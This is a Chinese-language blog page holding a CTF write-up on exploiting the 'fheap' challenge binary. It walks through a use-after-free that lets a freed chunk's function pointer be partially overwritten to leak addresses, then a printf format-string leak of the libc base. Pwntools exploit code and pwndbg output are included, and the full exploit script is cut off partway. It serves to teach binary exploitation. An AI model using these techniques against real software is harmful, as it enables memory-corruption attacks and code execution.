<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
<meta name="theme-color" content="#222">
<meta name="generator" content="Hexo 5.4.0">
  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
  <link rel="mask-icon" href="/images/logo.svg" color="#222">

<link rel="stylesheet" href="/css/main.css">


<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
  <link rel="stylesheet" href="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3/dist/jquery.fancybox.min.css">

<script id="hexo-configurations">
    var NexT = window.NexT || {};
    var CONFIG = {"hostname":"example.com","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":true,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
  </script>

  <meta property="og:type" content="website">
<meta property="og:title" content="Pwn进你的心">
<meta property="og:url" content="http://example.com/page/27/index.html">
<meta property="og:site_name" content="Pwn进你的心">
<meta property="og:locale" content="en_US">
<meta property="article:author" content="yhellow">
<meta name="twitter:card" content="summary">

<link rel="canonical" href="http://example.com/page/27/">


<script id="page-configurations">
  // https://hexo.io/docs/variables.html
  CONFIG.page = {
    sidebar: "",
    isHome : true,
    isPost : false,
    lang   : 'en'
  };
</script>

  <title>Pwn进你的心</title>
  






  <noscript>
  <style>
  .use-motion .brand,
  .use-motion .menu-item,
  .sidebar-inner,
  .use-motion .post-block,
  .use-motion .pagination,
  .use-motion .comments,
  .use-motion .post-header,
  .use-motion .post-body,
  .use-motion .collection-header { opacity: initial; }

  .use-motion .site-title,
  .use-motion .site-subtitle {
    opacity: initial;
    top: initial;
  }

  .use-motion .logo-line-before i { left: initial; }
  .use-motion .logo-line-after i { right: initial; }
  </style>
</noscript>

</head>

<body itemscope itemtype="http://schema.org/WebPage">
  <div class="container use-motion">
    <div class="headband"></div>

    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="Toggle navigation bar">
      <span class="toggle-line toggle-line-first"></span>
      <span class="toggle-line toggle-line-middle"></span>
      <span class="toggle-line toggle-line-last"></span>
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <span class="logo-line-before"><i></i></span>
      <h1 class="site-title">Pwn进你的心</h1>
      <span class="logo-line-after"><i></i></span>
    </a>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger">
    </div>
  </div>
</div>




<nav class="site-nav">
  <ul id="menu" class="main-menu menu">
        <li class="menu-item menu-item-home">

    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a>

  </li>
        <li class="menu-item menu-item-tags">

    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>Tags</a>

  </li>
        <li class="menu-item menu-item-categories">

    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>Categories</a>

  </li>
        <li class="menu-item menu-item-archives">

    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives</a>

  </li>
  </ul>
</nav>




</div>
    </header>

    
  <div class="back-to-top">
    <i class="fa fa-arrow-up"></i>
    <span>0%</span>
  </div>


    <main class="main">
      <div class="main-inner">
        <div class="content-wrap">
          

          <div class="content index posts-expand">
            
      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://example.com/2022/01/16/UAF+fmt/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="yhellow">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Pwn进你的心">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2022/01/16/UAF+fmt/" class="post-title-link" itemprop="url">UAF+fmt</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2022-01-16 15:51:27" itemprop="dateCreated datePublished" datetime="2022-01-16T15:51:27+08:00">2022-01-16</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2022-01-31 10:05:52" itemprop="dateModified" datetime="2022-01-31T10:05:52+08:00">2022-01-31</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Pwn-train/" itemprop="url" rel="index"><span itemprop="name">Pwn train</span></a>
                </span>
            </span>

          
            <span class="post-meta-item" title="Symbols count in article">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
              <span>6.6k</span>
            </span>
            <span class="post-meta-item" title="Reading time">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
              <span>6 mins.</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p><strong>fheap</strong></p>
<p><img src="/2022/01/16/UAF+fmt/1641894315063.png" alt="1641894315063"> </p>
<p>循环输入</p>
<p><img src="/2022/01/16/UAF+fmt/1641894377327.png" alt="1641894377327"> </p>
<p><img src="/2022/01/16/UAF+fmt/1641894384819.png" alt="1641894384819"> </p>
<p>64位，dynamically，全开</p>
<p><img src="/2022/01/16/UAF+fmt/1641894925868.png" alt="1641894925868"> </p>
<p><img src="/2022/01/16/UAF+fmt/1641894937765.png" alt="1641894937765"> </p>
<p>逻辑简单的程序</p>
<p><strong>函数“create”：</strong></p>
<p>程序出现了栈指针异常的错误：（可能掺入了花指）</p>
<p><img src="/2022/01/16/UAF+fmt/1641896636586.png" alt="1641896636586"> </p>
<p>解决方法如下：</p>
<p>在“0x12AA”处：用“P”创建函数，用“F5”进行反汇编</p>
<p><img src="/2022/01/16/UAF+fmt/1641897519387.png" alt="1641897519387"> </p>
<p>就是一段执行读操作的代码</p>
<p> <img src="/2022/01/16/UAF+fmt/1641902724901.png" alt="1641902724901"> </p>
<p> <img src="/2022/01/16/UAF+fmt/1641902743154.png" alt="1641902743154"> </p>
<p>先申请“0x20”字节大小的chunk：ptr</p>
<p>然后read读入输出长度：nbytes</p>
<p>输入“input”，获取“input”的实际长度，如果长度大于 “0xf” 就重新“malloc”一个chunk来存储“input”，否则就直接装入“ptr” （最多可以create16次）</p>
<p><strong>函数“delete”：</strong></p>
<p><img src="/2022/01/16/UAF+fmt/1641898184915.png" alt="1641898184915"> </p>
<p>没有用“free”，这个“unk_4040”无法识别</p>
<p><strong>动态调试</strong></p>
<p>IDA静态分析不能很好地体现程序的流程，先用GDB分析一下</p>
<p>输入值小于“0xf”：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; heap</span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: <span class="number">0x555555559000</span></span><br><span class="line">Size: <span class="number">0x291</span></span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: <span class="number">0x555555559290</span>	<span class="comment"># chunk1</span></span><br><span class="line">Size: <span class="number">0x31</span></span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: <span class="number">0x5555555592c0</span>	<span class="comment"># chunk2</span></span><br><span class="line">Size: <span class="number">0x31</span></span><br><span class="line"></span><br><span class="line">Top chunk | PREV_INUSE</span><br><span class="line">Addr: <span class="number">0x5555555592f0</span></span><br><span class="line">Size: <span class="number">0x20d11</span></span><br><span class="line"></span><br><span class="line">pwndbg&gt; x/20xg <span class="number">0x555555559290</span></span><br><span class="line"><span class="number">0x555555559290</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000031</span></span><br><span class="line"><span class="number">0x5555555592a0</span>:	<span class="number">0x0000616161616161</span>	<span class="number">0x0000000000000000</span>	<span class="comment"># chunk1</span></span><br><span class="line"><span class="number">0x5555555592b0</span>:	<span class="number">0x0000000000000006</span>	<span class="number">0x000055555555549c</span>	<span class="comment"># free_one</span></span><br><span class="line"><span class="number">0x5555555592c0</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000031</span></span><br><span class="line"><span class="number">0x5555555592d0</span>:	<span class="number">0x0000616161616161</span>	<span class="number">0x0000000000000000</span>	<span class="comment"># chunk2</span></span><br><span class="line"><span class="number">0x5555555592e0</span>:	<span class="number">0x0000000000000006</span>	<span class="number">0x000055555555549c</span>	<span class="comment"># free_one</span></span><br><span class="line"><span class="number">0x5555555592f0</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000020d11</span></span><br></pre></td></tr></table></figure>
<p>输入值大于“0xf”：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; heap</span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: <span class="number">0x555555559000</span></span><br><span class="line">Size: <span class="number">0x291</span></span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: <span class="number">0x555555559290</span>	<span class="comment"># chunk1</span></span><br><span class="line">Size: <span class="number">0x31</span></span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: <span class="number">0x5555555592c0</span>	<span class="comment"># chunk1_data</span></span><br><span class="line">Size: <span class="number">0x21</span></span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: <span class="number">0x5555555592e0</span>	<span class="comment"># chunk2</span></span><br><span class="line">Size: <span class="number">0x31</span></span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: <span class="number">0x555555559310</span>	<span class="comment"># chunk2_data</span></span><br><span class="line">Size: <span class="number">0x21</span></span><br><span class="line"></span><br><span class="line">Top chunk | PREV_INUSE</span><br><span class="line">Addr: <span class="number">0x555555559330</span></span><br><span class="line">Size: <span class="number">0x20cd1</span></span><br><span class="line"></span><br><span class="line">pwndbg&gt; x/100xg <span class="number">0x555555559290</span></span><br><span class="line"><span class="number">0x555555559290</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000031</span></span><br><span class="line"><span class="number">0x5555555592a0</span>:	<span class="number">0x00005555555592d0</span>	<span class="number">0x0000000000000000</span>	<span class="comment"># chunk1</span></span><br><span class="line"><span class="number">0x5555555592b0</span>:	<span class="number">0x0000000000000011</span>	<span class="number">0x00005555555554bb</span>	<span class="comment"># free_double</span></span><br><span class="line"><span class="number">0x5555555592c0</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000021</span>	</span><br><span class="line"><span class="number">0x5555555592d0</span>:	<span class="number">0x6161616161616161</span>	<span class="number">0x6161616161616161</span>	<span class="comment"># chunk1_data</span></span><br><span class="line"><span class="number">0x5555555592e0</span>:	<span class="number">0x000000000000000a</span>	<span class="number">0x0000000000000031</span>		</span><br><span class="line"><span class="number">0x5555555592f0</span>:	<span class="number">0x0000555555559320</span>	<span class="number">0x0000000000000000</span>	<span class="comment"># chunk2	</span></span><br><span class="line"><span class="number">0x555555559300</span>:	<span class="number">0x0000000000000011</span>	<span class="number">0x00005555555554bb</span>	<span class="comment"># free_double</span></span><br><span class="line"><span class="number">0x555555559310</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000021</span>	</span><br><span class="line"><span class="number">0x555555559320</span>:	<span class="number">0x6262626262626262</span>	<span class="number">0x6262626262626262</span>	<span class="comment"># chunk1_data</span></span><br><span class="line"><span class="number">0x555555559330</span>:	<span class="number">0x000000000000000a</span>	<span class="number">0x0000000000020cd1</span></span><br></pre></td></tr></table></figure>
<p>小于“0xf”时：直接把“input”写到自己的数据区</p>
<p>0x000055555555549c：“free_one”</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> __fastcall <span class="title">free_one</span><span class="params">(<span class="keyword">void</span> *a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="built_in">free</span>(a1);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>大于“0xf”时：先malloc一个chunk，然后把malloc出来的地址，写到自己的数据区</p>
<p>0x00005555555554bb：“free_double”</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __fastcall <span class="title">free_double</span><span class="params">(<span class="keyword">int</span> **a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> result; <span class="comment">// eax</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">free</span>(*a1);</span><br><span class="line">  <span class="built_in">free</span>(a1);</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>入侵思路</strong></p>
<p>没有栈溢出，有UAF漏洞（“free_one”和“free_double”都不置空指针）</p>
<p>先搭好框架：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">size,content</span>):</span></span><br><span class="line">	p.recvuntil(<span class="string">&quot;3.quit\n&quot;</span>)</span><br><span class="line">	p.sendline(<span class="string">&quot;create string&quot;</span>)</span><br><span class="line">	p.recvuntil(<span class="string">&quot;size:&quot;</span>)</span><br><span class="line">	p.sendline(<span class="built_in">str</span>(size))</span><br><span class="line">	p.recvuntil(<span class="string">&quot;str:&quot;</span>)</span><br><span class="line">	p.send(content)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span>(<span class="params"><span class="built_in">id</span></span>):</span></span><br><span class="line">	p.recvuntil(<span class="string">&quot;3.quit\n&quot;</span>)</span><br><span class="line">	p.sendline(<span class="string">&quot;delete string&quot;</span>)</span><br><span class="line">	p.recvuntil(<span class="string">&quot;id:&quot;</span>)</span><br><span class="line">	p.sendline(<span class="built_in">str</span>(<span class="built_in">id</span>))</span><br><span class="line">	p.recvuntil(<span class="string">&quot;sure?:&quot;</span>)</span><br><span class="line">	p.sendline(<span class="string">&#x27;yes&#x27;</span>)</span><br></pre></td></tr></table></figure>
<p>问题的关键就是“free_one”这个函数：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0x5555555592c0</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000031</span></span><br><span class="line"><span class="number">0x5555555592d0</span>:	<span class="number">0x0000616161616161</span>	<span class="number">0x0000000000000000</span>	<span class="comment"># chunk2</span></span><br><span class="line"><span class="number">0x5555555592e0</span>:	<span class="number">0x0000000000000006</span>	<span class="number">0x000055555555549c</span>	<span class="comment"># free_one</span></span><br></pre></td></tr></table></figure>
<p>“free_one”位于“chunk2 + 5”这个位置，它不属于“chunk2”，所以在“chunk2”被“free”的时候，它是不受影响的，因此“free_one”遗留在了“chunk2”中</p>
<p>如果利用UAF就可以把“chunk2”作为“chunk1”的“chunk1_data”：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">8</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">8</span>)</span><br><span class="line">add(<span class="number">8</span>,<span class="string">&#x27;b&#x27;</span>*<span class="number">8</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">call_puts_addr = <span class="string">&#x27;\x69&#x27;</span> + <span class="string">&#x27;\x00&#x27;</span></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">0x18</span> + call_puts_addr</span><br><span class="line">add(<span class="built_in">len</span>(payload),payload)</span><br><span class="line"></span><br><span class="line">delete(<span class="number">1</span>)</span><br></pre></td></tr></table></figure>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/20xg <span class="number">0x55ee908bc290</span></span><br><span class="line"><span class="number">0x55ee908bc290</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000031</span></span><br><span class="line"><span class="number">0x55ee908bc2a0</span>:	<span class="number">0x000055ee908bc2d0</span>	<span class="number">0x0000000000000000</span>	<span class="comment"># chunk1</span></span><br><span class="line"><span class="number">0x55ee908bc2b0</span>:	<span class="number">0x0000000000000019</span>	<span class="number">0x000055ee8f38e4bb</span>	<span class="comment"># free_double</span></span><br><span class="line"><span class="number">0x55ee908bc2c0</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000031</span></span><br><span class="line"><span class="number">0x55ee908bc2d0</span>:	<span class="number">0x6161616161616161</span>	<span class="number">0x6161616161616161</span>	<span class="comment"># chunk1_data(chunk2)</span></span><br><span class="line"><span class="number">0x55ee908bc2e0</span>:	<span class="number">0x6161616161616161</span>	<span class="number">0x000055ee8f38e469</span>	<span class="comment"># puts_addr</span></span><br><span class="line"><span class="number">0x55ee908bc2f0</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000020d11</span></span><br></pre></td></tr></table></figure>
<p>因为“chunk2”的指针并没有被置空，所以可以使用“delete(1)”操作“chunk2”，而遗留在“chunk2”中的“free_one”会被覆盖低字节为“puts”，泄露了内存数据</p>
<p>​        // 这里只能覆盖最后两位（溢出1字节），因为开了PIE只有最后3位固定</p>
<p>“free_one”原本的参数就是“chunk1_data”，现在改成了“pust”</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">p.recvuntil(<span class="string">&#x27;a&#x27;</span>*<span class="number">24</span>)</span><br><span class="line">puts_addr=u64(p.recvuntil(<span class="string">&#x27;1&#x27;</span>)[:-<span class="number">2</span>].ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="comment">#puts_addr=u64(p.recv(6).ljust(8,&#x27;\x00&#x27;))</span></span><br><span class="line">success(<span class="string">&#x27;puts_addr &gt;&gt; &#x27;</span>+<span class="built_in">hex</span>(puts_addr))</span><br></pre></td></tr></table></figure>
<p>可以顺势获“pro_base”，获取“printf_plt”，再利用“printf”格式化字符串来泄露“libc_base”</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">payload = <span class="string">&#x27;%33$p&#x27;</span>.ljust(<span class="number">0x18</span>,<span class="string">&#x27;a&#x27;</span>) + p64(printf_plt)		<span class="comment">#在libc上看的</span></span><br><span class="line">add(<span class="built_in">len</span>(payload),payload)</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; telescope <span class="number">0x55fa4c41a2c0</span></span><br><span class="line"><span class="number">00</span>:<span class="number">0000</span>│  <span class="number">0x55fa4c41a2c0</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">01</span>:<span class="number">0008</span>│  <span class="number">0x55fa4c41a2c8</span> ◂— <span class="number">0x31</span> <span class="comment">/* &#x27;1&#x27; */</span></span><br><span class="line"><span class="number">02</span>:<span class="number">0010</span>│  <span class="number">0x55fa4c41a2d0</span> ◂— <span class="number">0x6161617024323225</span> (<span class="string">&#x27;%22$paaa&#x27;</span>)</span><br><span class="line"><span class="number">03</span>:<span class="number">0018</span>│  <span class="number">0x55fa4c41a2d8</span> ◂— <span class="number">0x6161616161616161</span> (<span class="string">&#x27;aaaaaaaa&#x27;</span>)</span><br><span class="line"><span class="number">04</span>:<span class="number">0020</span>│  <span class="number">0x55fa4c41a2e0</span> ◂— <span class="number">0x6161616161616161</span> (<span class="string">&#x27;aaaaaaaa&#x27;</span>)</span><br><span class="line"><span class="number">05</span>:<span class="number">0028</span>│  <span class="number">0x55fa4c41a2e8</span> —▸ <span class="number">0x55fa4af3d174</span> (<span class="built_in">printf</span>@plt+<span class="number">4</span>) ◂— bnd jmp qword ptr [rip + <span class="number">0x2e1d</span>]</span><br><span class="line"><span class="number">06</span>:<span class="number">0030</span>│  <span class="number">0x55fa4c41a2f0</span> ◂— <span class="number">0x0</span></span><br></pre></td></tr></table></figure>
<p>发现泄露出来的地址和“libc_base”的差值固定，从而获取“libc_base”：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">In [<span class="number">9</span>]: <span class="number">0x7f02d59a86a0</span><span class="number">-0x7f02d57bc000</span></span><br><span class="line">Out[<span class="number">9</span>]: <span class="number">2016928</span></span><br><span class="line"></span><br><span class="line">In [<span class="number">10</span>]: hex(<span class="number">2016928</span>)</span><br><span class="line">Out[<span class="number">10</span>]: <span class="string">&#x27;0x1ec6a0&#x27;</span></span><br></pre></td></tr></table></figure>
<p>完整exp：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p=process(<span class="string">&#x27;./fheap&#x27;</span>)</span><br><span class="line">elf=ELF(<span class="string">&#x27;./fheap&#x27;</span>)</span><br><span class="line">libc=ELF(<span class="string">&#x27;./libc-2.31.so&#x27;</span>)</span><br><span class="line"><span class="comment">#context(arch=&#x27;amd64&#x27;,log_level=&#x27;debug&#x27;)</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">size,content</span>):</span></span><br><span class="line">	p.recvuntil(<span class="string">&quot;3.quit\n&quot;</span>)</span><br><span class="line">	p.sendline(<span class="string">&quot;create string&quot;</span>)</span><br><span class="line">	p.recvuntil(<span class="string">&quot;size:&quot;</span>)</span><br><span class="line">	p.sendline(<span class="built_in">str</span>(size))</span><br><span class="line">	p.recvuntil(<span class="string">&quot;str:&quot;</span>)</span><br><span class="line">	p.send(content)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span>(<span class="params"><span class="built_in">id</span></span>):</span></span><br><span class="line">	p.recvuntil(<span class="string">&quot;3.quit\n&quot;</span>)</span><br><span class="line">	p.sendline(<span class="string">&quot;delete string&quot;</span>)</span><br><span class="line">	p.recvuntil(<span class="string">&quot;id:&quot;</span>)</span><br><span class="line">	p.sendline(<span class="built_in">str</span>(<span class="built_in">id</span>))</span><br><span class="line">	p.recvuntil(<span class="string">&quot;sure?:&quot;</span>)</span><br><span class="line">	p.sendline(<span class="string">&#x27;yes&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">8</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">8</span>)</span><br><span class="line">add(<span class="number">8</span>,<span class="string">&#x27;b&#x27;</span>*<span class="number">8</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">call_puts_addr = <span class="string">&#x27;\x69&#x27;</span> + <span class="string">&#x27;\x00&#x27;</span></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">0x18</span> + call_puts_addr</span><br><span class="line">add(<span class="built_in">len</span>(payload),payload)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;a&#x27;</span>*<span class="number">24</span>)</span><br><span class="line">puts_addr=u64(p.recvuntil(<span class="string">&#x27;1&#x27;</span>)[:-<span class="number">2</span>].ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="comment">#puts_addr=u64(p.recv(6).ljust(8,&#x27;\x00&#x27;))</span></span><br><span class="line">success(<span class="string">&#x27;puts_addr &gt;&gt; &#x27;</span>+<span class="built_in">hex</span>(puts_addr))</span><br><span class="line"></span><br><span class="line">pro_base=puts_addr-<span class="number">0x1469</span></span><br><span class="line">success(<span class="string">&#x27;pro_base &gt;&gt; &#x27;</span>+<span class="built_in">hex</span>(pro_base))</span><br><span class="line">printf_plt=pro_base+elf.plt[<span class="string">&#x27;printf&#x27;</span>]</span><br><span class="line">success(<span class="string">&#x27;printf_plt &gt;&gt; &#x27;</span>+<span class="built_in">hex</span>(printf_plt))</span><br><span class="line"></span><br><span class="line">delete(<span 